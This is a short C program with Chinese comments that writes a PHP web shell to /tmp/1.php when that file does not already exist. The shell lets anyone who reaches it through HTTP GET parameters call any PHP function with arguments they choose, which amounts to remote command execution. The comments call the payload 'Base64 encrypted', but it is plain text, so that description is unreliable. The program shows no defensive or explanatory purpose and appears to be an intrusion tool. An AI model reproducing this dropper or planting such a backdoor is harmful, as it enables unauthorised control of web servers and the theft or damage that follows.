#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 这里替换为您要写入的Base64加密字符串
const char* base64EncodedString = "<?php\n\n$func = new ReflectionFunction($_GET[m]);\n\necho $func->invokeArgs(array($_GET[c]));\n\n?>";

int main() {
    FILE *file;

    // 判断文件是否存在
    if ((file = fopen("/tmp/1.php", "r")) == NULL) {
        // 文件不存在，创建文件并写入Base64加密字符串
        file = fopen("/tmp/1.php", "w");
        if (file == NULL) {
            perror("Error creating file");
            return 1;
        }

        // 写入Base64加密字符串
        size_t length = strlen(base64EncodedString);
        size_t bytes_written = fwrite(base64EncodedString, sizeof(char), length, file);

        if (bytes_written != length) {
            perror("Error writing to file");
            fclose(file);
            return 1;
        }

        printf("Base64 encoded string written to file.\n");
    } else {
        // 文件已存在
       // printf("File '1.php' already exists.\n");
        fclose(file);
    }

    return 0;
}
